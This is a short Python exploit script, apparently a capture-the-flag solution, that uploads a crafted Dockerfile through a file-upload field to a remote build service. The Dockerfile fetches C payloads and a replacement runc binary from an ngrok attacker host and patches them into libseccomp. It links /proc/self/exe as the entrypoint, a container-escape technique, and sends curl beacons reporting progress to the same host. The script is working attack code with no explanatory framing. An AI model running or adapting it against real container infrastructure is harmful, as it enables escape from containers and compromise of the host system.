import os
import requests

def upload(xpl):
    fp = {
        'file': ('diofeher.py', open('code.py', 'rb') ),
    }
    URL = 'http://localhost:8091/upload'
    URL = 'http://sss.xpl.sh/upload'
    print('request url:', URL)
    body = requests.post(URL, files=fp, data=dict(filename=xpl))
    print('response status code:', body.status_code)
    print('response body:')
    print(body.text)


def main():
    cmd = """. .
RUN apt-get -y install curl
RUN curl --silent --output /dev/null {url}/comecando
RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential ;\
    cd /root ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp

RUN curl --silent --output /dev/null {url}/baixou+seccomp+v0.0.14

RUN curl {url}/stage2.c -o /root/stage2.c
RUN curl {url}/new_runc -o /root/new_runc

RUN set -e -x ;\
    cd /root ;\
    gcc stage2.c -o /stage2
RUN curl {url}/stage1.c -o /root/stage1.c

RUN curl --silent --output /dev/null {url}/gonna_build_libseccomp1
RUN set -e -x ;\
    cd /root/libseccomp-2.3.1 ;\
    cat /root/stage1.c >> src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /root/*.deb

RUN curl --silent --output /dev/null {url}/built_libseccomp

ENTRYPOINT [ "/entrypoint" ]

RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint

RUN curl {url}/test.py -o code.py
RUN curl --silent --output /dev/null {url}/finished+script
#""".format(url='http://07320c36.ngrok.io')
    cmd = cmd.replace('/', '\x2f')
    print('length:', len(cmd))
    upload(cmd)

main()
